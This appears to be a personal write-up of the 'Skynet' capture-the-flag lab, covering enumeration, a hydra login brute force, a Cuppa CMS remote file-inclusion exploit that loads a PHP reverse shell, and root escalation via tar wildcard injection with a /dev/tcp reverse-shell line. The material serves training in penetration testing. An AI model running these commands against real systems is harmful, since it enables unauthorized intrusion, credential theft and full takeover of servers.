===Skynet   Flutter Sept 4 2021===

# Enum #

nmap -sV -sC -T5 -p- -oN nmap_initial $IP

	PORT    STATE SERVICE     VERSION

	22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
	| ssh-hostkey: 
	|   2048 99:23:31:bb:b1:e9:43:b7:56:94:4c:b9:e8:21:46:c5 (RSA)
	|   256 57:c0:75:02:71:2d:19:31:83:db:e4:fe:67:96:68:cf (ECDSA)
	|_  256 46:fa:4e:fc:10:a5:4f:57:57:d0:6d:54:f6:c3:4d:fe (EdDSA)

	80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
	|_http-server-header: Apache/2.4.18 (Ubuntu)
	|_http-title: Skynet

	110/tcp open  pop3        Dovecot pop3d
	|_pop3-capabilities: UIDL SASL AUTH-RESP-CODE RESP-CODES CAPA TOP PIPELINING

	139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)

	143/tcp open  imap        Dovecot imapd
	|_imap-capabilities: IMAP4rev1 have SASL-IR listed post-login ENABLE capabilities IDLE LOGINDISABLEDA0001 more OK ID LITERAL+ Pre-login LOGIN-REFERRALS

	445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)

gobuster dir -u http://$IP -w directory-list-2.3-medium.txt -o gobuster.out

	/admin (Status: 301)
	/css (Status: 301)
	/js (Status: 301)
	/config (Status: 301)
	/ai (Status: 301)
	/squirrelmail (Status: 301)
	/server-status (Status: 403)

> all forbidden redirects except for /squirrelmail

/squirrelmail

> SquirrelMail version 1.4.23 login page

enum4linux -a $IP | tee smbenum.out

- Shares

		Sharename       Type      Comment
		---------       ----      -------
		print$          Disk      Printer Drivers
		anonymous       Disk      Skynet Anonymous Share
		milesdyson      Disk      Miles Dyson Personal Share
		IPC$            IPC       IPC Service (skynet server (Samba, Ubuntu))

- Users

		SKYNET\nobody (Local User)
		SKYNET\milesdyson (Local User)


## smbclient //$IP/anonymous

	smb: \> ls
	  attention.txt                       N      163  Wed Sep 18 04:04:59 2019
	  logs                                D        0  Wed Sep 18 05:42:16 2019
	smb: \> prompt
	smb: \> mget attention.txt
	smb: \> cd logs
	smb: \> ls
	  log2.txt                            N        0  Wed Sep 18 05:42:13 2019
	  log1.txt                            N      471  Wed Sep 18 05:41:59 2019
	  log3.txt                            N        0  Wed Sep 18 05:42:16 2019
	smb: \> mget *
	smb: \> exit

- attention.txt

		A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.
		-Miles Dyson


- log1.txt

		cyborg007haloterminator
		terminator22596
		terminator219
		terminator20
		terminator1989
		terminator1988
		terminator168
		terminator16
		terminator143
		terminator13
		terminator123!@#
		terminator1056
		terminator101
		terminator10
		terminator02
		terminator00
		roboterminator
		pongterminator
		manasturcaluterminator
		exterminator95
		exterminator200
		dterminator
		djxterminator
		dexterminator
		determinator
		cyborg007haloterminator
		avsterminator
		alonsoterminator
		Walterminator
		79terminator6
		1996terminator

- log2.txt and log3.txt empty

---

# Intrusion #


## Logging in to $IP/squirrelmail as milesdyson

3 received emails

	2 "no subject" from serenakogan@skynet
	1 "Samba Password Reset" from skynet@skynet

> No subjects

	'balls have zero to me to me to me to me to me to me to me to me to'

> Samba Password Reset

	'We have changed your smb password after system malfunction. Password: )s{A&2Z=F^n_E.B`'


## Logging in to milesdyson Samba share

smbclient //$IP/milesdyson -U milesdyson

	smb: \> ls
	  a ton of pdfs
	  notes\ directory
	smb: \> cd notes\
	smb: \> ls
	  a ton of .md files
	  important.txt
	smb: \> mget important.txt
	smb: \> exit

- important.txt

		1. Add features to beta CMS /45kra24zxs28v3yd
		2. Work on T-800 Model 101 blueprints
		3. Spend more time with my wife

> aww, they want to spend more time with their wife :c
	
> anyway, discovered directory

---

## Visiting $IP/45kra24zxs28v3yd

	Miles Dyson Personal Page

	Short biography for Miles Dyson

gobuster dir -u http://$IP/45kra24zxs28v3yd/ -w directory-list-2.3-medium.txt -o gobuster_45kra24zxs28v3yd.out

	/administrator (Status: 301)


- /45kra24zxs28v3yd/administrator
	
		Cuppa login page

searchsploit cuppa

	exploit 25971

## testing for exploit 25971

> http://$IP/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd

	root:x:0:0:root:/root:/bin/bash
	daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
	bin:x:2:2:bin:/bin:/usr/sbin/nologin
	sys:x:3:3:sys:/dev:/usr/sbin/nologin
	sync:x:4:65534:sync:/bin:/bin/sync
	games:x:5:60:games:/usr/games:/usr/sbin/nologin
	man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
	lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
	mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
	news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
	uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
	proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
	www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
	backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
	list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
	irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
	gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
	nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
	systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
	systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
	systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
	systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
	syslog:x:104:108::/home/syslog:/bin/false
	_apt:x:105:65534::/nonexistent:/bin/false
	lxd:x:106:65534::/var/lib/lxd/:/bin/false
	messagebus:x:107:111::/var/run/dbus:/bin/false
	uuidd:x:108:112::/run/uuidd:/bin/false
	dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
	sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
	milesdyson:x:1001:1001:,,,:/home/milesdyson:/bin/bash
	dovecot:x:111:119:Dovecot mail server,,,:/usr/lib/dovecot:/bin/false
	dovenull:x:112:120:Dovecot login user,,,:/nonexistent:/bin/false
	postfix:x:113:121::/var/spool/postfix:/bin/false
	mysql:x:114:123:MySQL Server,,,:/nonexistent:/bin/false


Going to directory with php-reverse-shell.php

	renamed it cats.php... just because I love cats

Started python web server

	python -m http.server

Started listener
	
	rlwrap nc -lvnp 4449

Exploiting 25971

	Visiting "http://10.10.204.106/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://$MYIP:8010/cats.php"

## Yay! Reverse shell achieved

	$ pwd;whoami;id
	/
	www-data
	uid=33(www-data) gid=33(www-data) groups=33(www-data)


# PrivEsc

## Stabalisation

	$ python -c 'import pty; pty.spawn("/bin/bash")'

## Movement

www-data@skynet:/$ cd /home/milesdyson
www-data@skynet:/home/milesdyson$ ls -la
		
		lrwxrwxrwx 1 root       root          9 Sep 17  2019 .bash_history -> /dev/null
		-rw-r--r-- 1 milesdyson milesdyson  220 Sep 17  2019 .bash_logout
		-rw-r--r-- 1 milesdyson milesdyson 3771 Sep 17  2019 .bashrc
		-rw-r--r-- 1 milesdyson milesdyson  655 Sep 17  2019 .profile
		drwxr-xr-x 2 root       root       4096 Sep 17  2019 backups
		drwx------ 3 milesdyson milesdyson 4096 Sep 17  2019 mail
		drwxr-xr-x 3 milesdyson milesdyson 4096 Sep 17  2019 share
		-rw-r--r-- 1 milesdyson milesdyson   33 Sep 17  2019 user.txt

www-data@skynet:/home/milesdyson$ cat user.txt

	Flag Found

www-data@skynet:/home/milesdyson$ cat /etc/crontab
		
		SHELL=/bin/sh
		PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

		# m h dom mon dow user  command
		*/1 *   * * *   root    /home/milesdyson/backups/backup.sh
		17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
		25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
		47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
		52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
	
www-data@skynet:/home/milesdyson$ ls -la backups
		
		-rwxr-xr-x 1 root       root            74 Sep 17  2019 backup.sh
		-rw-r--r-- 1 root       root       4679680 Sep  4 18:46 backup.tgz

www-data@skynet:/home/milesdyson/backups$ cd backups
www-data@skynet:/home/milesdyson/backups$ cat backup.sh
		
		#!/bin/bash
		cd /var/www/html
		tar cf /home/milesdyson/backups/backup.tgz *
		
> executed as root every 1 minute

> compressing the content of /var/www/html using tar and saving to milesdyson home


Looking on GTFOBins for tar privesc

> tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh'

	www-data@skynet:/home/milesdyson/backups$ printf '#!/bin/bash\nbash -i >& /dev/tcp/$MYIP/9000 0>&1' > /var/www/html/shell
	www-data@skynet:/home/milesdyson/backups$ chmod +x /var/www/html/shell
	www-data@skynet:/home/milesdyson/backups$ touch /var/www/html/--checkpoint=1
	www-data@skynet:/home/milesdyson/backups$ touch /var/www/html/--checkpoint-action=exec=bash\ shell

Starting listener on port 9000

	rlwrap nc -lvnp 9000

## Caught root session!

root@skynet:/var/www/html# pwd;whoami;id
		
		/var/www/html
		root
		uid=0(root) gid=0(root) groups=0(root)

root@skynet:/var/www/html# cd ~
root@skynet:~# ls
		
		root.txt

root@skynet:~# cat root.txt
	
	Flag Found

# Passwords

## SquirrelMail

milesdyson: cyborg007haloterminator

> hydra -l milesdyson -P Enum/anonymous_share/log1.txt $IP http-form-post '/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:F=Unknown user or password incorrect.'

## Samba

milesdyson: )s{A&2Z=F^n_E.B`

> Found after logging in to their SquirrelMail account
